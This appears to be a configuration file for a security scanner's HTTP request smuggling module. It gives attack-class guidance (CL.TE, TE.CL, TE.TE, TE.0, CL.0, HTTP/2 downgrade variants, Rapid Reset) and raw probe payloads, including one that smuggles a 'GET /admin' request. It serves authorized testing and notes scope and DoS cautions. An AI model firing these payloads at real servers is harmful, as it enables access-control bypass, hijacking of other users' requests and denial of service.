craft_guidance: 1. CLASSIC: CL.TE / TE.CL / TE.TE on HTTP/1.1 between front-end (CDN/LB) and origin.

2. 2024 CLASSES (Smashing the State Machine, J. Kettle): TE.0 (back-end ignores chunked, expects 0-byte body); CL.0 (server reads 0 bytes regardless of CL); H2.CL / H2.TE (HTTP/2 frame plus HTTP/1 header confuses h2c proxies); 0.CL (client uses CL but TLS terminator strips it).

3. H2->H1 DOWNGRADE: cleartext h2c (HTTP/2 cleartext) terminating to HTTP/1.1 origin is the 2024 hot zone. Inject `Content-Length: 0` in HTTP/2 :method = POST + body; some h2c proxies pass body to origin which sees 0-byte body and reads next request.
4. CONNECTION-KEEP-ALIVE: send `Connection: close` on outer; some HTTP/2 stacks keep connection open and reuse for the next request, smuggling the previous body.
5. EARLY-RESPONSE: trigger 4xx on the first request; if connection stays open, smuggled tail becomes start of next victim request.
6. PIPELINING: send two requests rapidly; if second response is delayed beyond timeout, pipelining is enabled and smuggling viable.
7. DETECT WITHOUT BREAKING THE TARGET: timing-based (5s+ delay) > 4xx > smuggled body delivered. Don't poison shared cache without explicit authorization (R5 destructive concern).
8. RESPONSE-SPLITTING via SMUGGLING: smuggled request gets victim's response. Use carefully; document scope authorization.
9. WS UPGRADE PIVOT: smuggle a WebSocket Upgrade request; if origin upgrades, attacker controls a hijacked WS to victim.
10. HTTP/2 RAPID RESET (CVE-2023-44487): not strictly smuggling but related — opening many streams with immediate RST_STREAM is a DoS class on most h2 stacks.

cl_te.description: CL.TE request smuggling — front-end uses Content-Length, back-end uses Transfer-Encoding

probes.payload:
POST / HTTP/1.1
Host: {{host}}
Content-Length: 6
Transfer-Encoding: chunked

0

G
probes.description: CL.TE smuggling detection — front-end forwards 6 bytes (Content-Length), back-end parses chunked and sees 0-length chunk terminator, leaving 'G' as start of next request. Timeout indicates back-end is waiting for the smuggled request to complete.

te_cl.description: TE.CL request smuggling — front-end uses Transfer-Encoding, back-end uses Content-Length

probes.payload:
POST / HTTP/1.1
Host: {{host}}
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
probes.description: TE.CL smuggling detection — front-end processes chunked encoding (chunk size 8 = 'SMUGGLED'), back-end reads only 3 bytes (Content-Length) and treats the rest as a new request. Timeout or status error indicates desync.

te_te.description: TE.TE request smuggling — both servers use Transfer-Encoding but one can be confused by obfuscated TE header variants

probes.payload:
POST / HTTP/1.1
Host: {{host}}
Content-Length: 3
Transfer-Encoding: xchunked

0
probes.description: TE obfuscation via invalid value 'xchunked' — if front-end ignores malformed TE and falls back to Content-Length while back-end rejects and also falls back, differential parsing causes desync

probes.payload:
POST / HTTP/1.1
Host: {{host}}
Content-Length: 3
Transfer-Encoding:	chunked

0
probes.description: TE obfuscation via tab before value — some servers reject TE headers with tab whitespace and fall back to Content-Length, creating parsing differential

probes.payload:
POST / HTTP/1.1
Host: {{host}}
Content-Length: 3
Transfer-Encoding: chunked
Transfer-encoding: x

0
probes.description: TE obfuscation via duplicate header with different case — one server uses first TE (chunked), the other uses second (invalid 'x') and falls back to Content-Length, causing desync

te_zero.description: TE.0 — front-end uses Transfer-Encoding chunked, back-end ignores TE entirely and treats body as 0 bytes (because no Content-Length). Body bytes become the start of the NEXT request (Smashing the State Machine 2024 class).

probes.payload:
POST / HTTP/1.1
Host: {{host}}
Transfer-Encoding: chunked

26
GET /admin HTTP/1.1
Host: {{host}}

0
probes.description: TE.0 — front-end uses chunked, back-end has no CL fallback and reads 0 bytes; smuggled GET /admin becomes the next request.

cl_zero.description: CL.0 — back-end ignores Content-Length and reads 0 bytes (e.g. some HTTP/2 origins terminating from h2c). Body becomes start of next request (Smashing the State Machine 2024 class).

probes.description: CL.0 — front-end forwards 26 bytes, back-end reads 0 (CL ignored); smuggled GET /admin becomes the next request seen by origin.

h2_cl.description: H2.CL — HTTP/2 request with Content-Length header (spec says CL is informational on H2). Some h2c->h1 downgrading proxies trust the CL while origin uses the framed length, causing desync. Heavy 2024 research vector.

probes.description: [Manual] Send HTTP/2 POST with Content-Length: 0 but actual body data. h2c proxy pads to 0; origin sees framed body. Smuggling primitive established. Use a manual h2 client (e.g. h2c.py).

h2_te.description: H2.TE — HTTP/2 request carrying Transfer-Encoding header (forbidden in H2). Some h2c origins still parse TE on the H1 side after downgrade.

probes.description: [Manual] HTTP/2 request with Transfer-Encoding: chunked + framed body. Origin downgrades to HTTP/1.1 and chunks the framed body, treating leftover as next request.

h2_rapid_reset.description: CVE-2023-44487 HTTP/2 Rapid Reset — open N streams + immediate RST_STREAM. Most h2 stacks process headers before honoring reset, causing CPU/memory exhaustion. Distinct from request smuggling but classed adjacent.

probes.description: [Manual] Open 100+ HTTP/2 streams + RST_STREAM each. Connection-level CPU spike or 502 cluster-wide indicates Rapid Reset DoS. Authorize before testing — DoS class.
